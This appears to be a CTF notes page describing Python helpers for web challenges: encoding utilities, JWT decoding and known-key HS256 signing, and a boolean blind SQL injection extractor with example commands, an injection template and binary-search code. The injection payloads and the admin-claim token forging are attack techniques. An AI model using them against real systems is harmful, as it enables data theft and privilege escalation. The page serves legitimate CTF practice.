---
title: "Python · Reusable Web Helpers"
weight: 95
bookToc: true
---

# Reusable Python for Web CTFs

Prepared snippets for offline notes. The two downloads use the Python standard library. They do not need AI, an API key, or package installation. Use the event-permitted runtime and follow the event's rules on saved code.

| Download | Purpose | Network access |
| --- | --- | --- |
| [web_helpers.py](/snippets/web/web_helpers.py) | Hex, Base64, URL, XOR, hashes, JWT inspection / known-key HS256 signing | None |
| [sqli_boolean.py](/snippets/web/sqli_boolean.py) | Extract one scalar using an already-proven boolean GET oracle | Only the endpoint you supply |

## 1. Exact bytes in and out

```bash
python web_helpers.py hex-decode --text 666c61677b64656d6f7d --output decoded.bin
python web_helpers.py b64-decode --text 'ZmxhZ3tkZW1vfQ==' --output decoded.bin
python web_helpers.py url-encode --text "' UNION SELECT NULL-- -"
python web_helpers.py xor --file cipher.bin --key-hex 494345 --output plain.bin
python web_helpers.py hashes --file sample.bin
```

The helper does not add a newline to binary output. `--text` means UTF-8 text, `--file` means actual bytes, and `--key-hex 494345` means the three bytes `ICE`, not the six ASCII characters `494345`.

### Small copyable equivalents

```python
import base64
from pathlib import Path

raw = bytes.fromhex('666c61677b64656d6f7d')
assert raw == b'flag{demo}'
assert base64.b64decode(b'ZmxhZ3tkZW1vfQ==', validate=True) == raw
Path('decoded.bin').write_bytes(raw)
```

```python
from urllib.parse import quote, unquote, unquote_plus

payload = "' UNION SELECT NULL-- -"
encoded = quote(payload, safe='')
assert unquote(encoded) == payload
assert unquote('a+b') == 'a+b'        # URL percent decoding
assert unquote_plus('a+b') == 'a b'   # URL-encoded form decoding
```

## 2. Inspect a JWT, without claiming verification

```bash
python web_helpers.py jwt-inspect --file token.txt
```

Minimal decoder:

```python
import base64
import json

token = 'eyJhbGciOiJub25lIn0.eyJyb2xlIjoidXNlciJ9.'
for part in token.split('.')[:2]:
    raw = base64.urlsafe_b64decode(part + '=' * (-len(part) % 4))
    print(json.loads(raw))
# Decoded header/payload only. This does not verify or authenticate the token.
```

## 3. Sign HS256 when the challenge gives you the key

Create `claims.json`:

```json
{"header":{"alg":"HS256","typ":"JWT"},"payload":{"sub":"ctf-user","role":"admin"}}
```

Store the exact known secret bytes in `key.bin`; a newline is a byte too.

```bash
python web_helpers.py jwt-sign-hs256 --file claims.json --key-file key.bin --output token.txt
```

This constructs an HMAC using a **known key**. It does not crack a key, convert an RSA token, or prove the server accepts your claims. Use only the algorithm and validation behavior actually established in the [JWT workflow](../jwt/).

## 4. Boolean SQL extractor — what you must establish first

1. Correct endpoint, parameter, session, and SQL context.
2. Correct database engine and target scalar expression.
3. A true body marker and a false body marker that cannot both appear.
4. One stable target row. Use its real primary key or stable ordering.

Example against a local / challenge SQLite search endpoint with `found-product` and `no-products` as its actual markers:

```bash
python sqli_boolean.py \
  --url 'http://ctf.invalid/item' \
  --parameter id \
  --template '1 AND ({predicate})' \
  --engine sqlite \
  --expression '(SELECT flag FROM flags ORDER BY id LIMIT 1)' \
  --true-marker 'found-product' \
  --false-marker 'no-products' \
  --max-length 128 \
  --max-requests 2000
```

Replace the host, query, markers, and template with what you already verified. For a quoted value, an example template is `apple' AND ({predicate})-- -`; quote that shell argument correctly or save the arguments in your own notes. The script URL-encodes the parameter for you.

### What it does

```text
verify constant true/false controls
  → reject NULL target
  → binary-search length
  → binary-search printable ASCII codes
  → verify each character equality
  → recheck every code point and final length
```

Progress goes to stderr; the final recovered value goes to stdout. HTTP errors, connection timeouts, and responses containing both/neither marker stop the run as **unknown/incomplete**, rather than corrupting the result.

### Limits

- GET parameters only; no JSON/form requests or CSRF token refresh.
- Printable ASCII 32–126 only; adapt the extractor for non-ASCII/binary values.
- SQL Server `LEN` ignores trailing spaces; choose a hex or explicitly represented target if necessary.
- Application redirects / login fallbacks may hide an expired session; markers must distinguish real results.
- No time-based oracle, automatic engine fingerprinting, or table discovery.
- No checkpoint/resume; keep a stable endpoint and known extraction target.

## 5. Offline extraction logic you can adapt

```python
def binary_search_code(ask, expression, low=32, high=126):
    # ask(predicate) must return True/False, and raise on an unknown response.
    while low < high:
        midpoint = (low + high) // 2
        if ask(f'{expression}>{midpoint}'):
            low = midpoint + 1
        else:
            high = midpoint
    if not ask(f'{expression}={low}'):
        raise RuntimeError('Unstable oracle or out-of-range character')
    return chr(low)
```

Read [blind SQLi](../sqli-blind/) before adapting the transport. A wrong oracle is more damaging than a slow extractor.

Tool map: [Python](../../ajcbbc_allow_tools/python3/) · [uv](../../ajcbbc_allow_tools/uv/) · [Burp](../../ajcbbc_allow_tools/burp_suite_community/) · [CyberChef](../../tools-cheatsheet/cyberchef-cheatsheet/).
